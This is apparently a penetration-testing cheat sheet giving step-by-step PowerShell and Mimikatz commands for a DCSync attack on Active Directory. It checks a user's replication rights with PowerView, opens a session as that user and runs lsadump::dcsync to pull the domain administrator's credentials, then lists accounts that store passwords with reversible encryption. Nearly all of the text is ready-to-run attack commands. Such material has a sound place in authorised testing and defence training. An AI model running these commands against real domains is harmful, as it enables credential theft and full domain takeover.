---
legal-banner: true
---

### **STEP 1. DEFINE USER' SID AND CHECK REPLICATION RIGHTS**

1.  Import the PowerView module :  
    `Import-Module PowerView`
    
2.  View the group membership of the user (e.g., user adunn):  
    `Get-DomainUser -Identity [USERNAME] | select samaccountname, objectsid, memberof, useraccountcontrol | fl`
    
3.  Define the user's SID (Security Identifier). Replace the placeholder SID with the actual SID of the user you are investigating:  
    `$sid = "S-1-5-21-1234567890-9876543210-4567891230-5678"`
    
4.  Check if the user has replication rights for the specified domain:
    

```Powershell
Get-ObjectAcl -Identity "DC=EXAMPLE,DC=LOCAL" -ResolveGUIDs |
    Where-Object { ($_.ObjectAceType -match 'Replication-Get') } |
    Where-Object { $_.SecurityIdentifier -match $sid } |
    Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl

```

### **STEP 2. PERFORMING THE DCSYNC ATTACK**

5.  Open a PowerShell session as the user with DCSync privileges:  
    `runas /netonly /user:EXAMPLE\[USERNAME] powershell`
6.  Run Mimikatz:  
    `.\mimikatz.exe`
7.  Enable debug privileges:  
    `mimikatz # privilege::debug`
8.  Execute DCSync:  
    `mimikatz # lsadump::dcsync /domain:EXAMPLE.LOCAL /user:EXAMPLE\administrator`

### **STEP 3. ADDITIONAL ENUMERATION**

9.  Check if user accounts with the reversible encryption option enabled:

```Powershell
Get-DomainUser -Identity * | 
    ? { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } | 
    select samaccountname, useraccountcontrol
```

10. Enumerate accounts with reversible encryption using Get-ADUser:  
    `Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`